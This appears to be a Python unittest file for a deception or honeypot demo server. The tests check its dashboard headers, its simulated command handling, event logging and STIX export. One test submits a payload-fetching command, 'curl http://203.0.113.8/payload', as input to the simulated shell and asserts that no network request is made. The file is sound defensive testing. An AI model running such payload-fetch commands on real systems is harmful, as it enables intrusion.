import json
import tempfile
import threading
import unittest
from http.server import HTTPServer
from pathlib import Path
from urllib.error import HTTPError
from urllib.request import Request, urlopen

from adn.core import EventStore, SimulatedShell
from adn.web import create_handler


class DemoServerTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.store = EventStore(Path(self.temp_dir.name) / "events.sqlite3")
        self.server = HTTPServer(("127.0.0.1", 0), create_handler(self.store, SimulatedShell()))
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.base_url = f"http://127.0.0.1:{self.server.server_port}"

    def tearDown(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join()
        self.store.close()
        self.temp_dir.cleanup()

    def test_serves_dashboard_and_security_headers(self) -> None:
        with urlopen(self.base_url) as response:
            page = response.read().decode("utf-8")
            self.assertEqual(response.status, 200)
            self.assertIn("Deception overview", page)
            self.assertEqual(response.headers["X-Content-Type-Options"], "nosniff")

    def test_command_is_simulated_recorded_and_exported(self) -> None:
        request = Request(
            f"{self.base_url}/api/command",
            data=json.dumps({"command": "curl http://203.0.113.8/payload"}).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request) as response:
            payload = json.loads(response.read())
        self.assertIn("No network request was made", payload["response"])
        self.assertEqual(payload["techniques"], ["T1105"])

        with urlopen(f"{self.base_url}/api/events") as response:
            events = json.loads(response.read())["events"]
        self.assertEqual(len(events), 1)
        self.assertIsNone(events[0]["source_ip"])

        with urlopen(f"{self.base_url}/api/stix") as response:
            feed = json.loads(response.read())
            self.assertIn("attachment;", response.headers["Content-Disposition"])
        self.assertEqual(feed["type"], "bundle")
        self.assertEqual(len(feed["objects"]), 1)

    def test_rejects_malformed_command_payload(self) -> None:
        request = Request(
            f"{self.base_url}/api/command",
            data=b'{"command": 1}',
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with self.assertRaises(HTTPError) as error:
            urlopen(request)
        self.assertEqual(error.exception.code, 400)
        payload = json.loads(error.exception.read())
        self.assertIn("string 'command'", payload["error"])


if __name__ == "__main__":
    unittest.main()
